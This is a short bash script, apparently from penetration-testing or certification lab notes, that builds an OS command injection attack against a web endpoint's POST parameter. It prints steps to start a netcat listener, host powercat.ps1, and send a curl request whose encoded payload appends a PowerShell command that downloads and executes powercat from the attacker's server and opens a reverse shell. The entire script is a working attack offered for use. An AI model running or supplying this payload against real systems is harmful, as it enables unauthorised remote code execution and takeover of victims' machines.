#OS Command injection - Powershell usage - hijack Post request
#Remember to use Burp Proxy to get the POST request - eg: POST /archive HTTP/1.1
#http://192.168.50.189:8000 --> POST --> http://192.168.50.189:8000/archive

#!/bin/bash

# Ask user for their current IP address (web server IP)
read -p "Enter your current IP address (for the web server and to catch the shell): " ip_address

# Ask user for the port to listen to (e.g., 4444)
read -p "Enter the port to listen on (e.g., 4444): " port_number

# Ask user for the parameter and first command (e.g., 'Archive=git')
read -p "Enter the parameter and first command (e.g., 'Archive=git'): " param_command

# Ask user for the target URL (e.g., http://192.168.50.189:8000/archive)
read -p "Enter the target URL (e.g., http://192.168.50.189:8000/archive): " target_url

# Output the responses for all questions
echo "IP Address: $ip_address"
echo "Port Number: $port_number"
echo "Parameter and Command: $param_command"
echo "Target URL: $target_url"

# Instructions
echo "Step 1: Copy the powercat.ps1 script"
echo "cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 powercat.ps1"

echo ' '

echo "Step 2: Start the listener on your current IP address and port"
echo "nc -nlvp $port_number"

echo ' '

echo "Step 3: Run your web server on $ip_address"
echo "python3 -m http.server 80"

echo ' '

# Construct the curl command for OS command injection
echo "Step 4: Execute the curl command"
encoded_command=$(echo "$param_command%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F$ip_address%2Fpowercat.ps1%22)%3Bpowercat%20-c%20$ip_address%20-p%20$port_number%20-e%20powershell")

echo ' '
echo ' '
echo "curl -X POST --data '$encoded_command' $target_url"
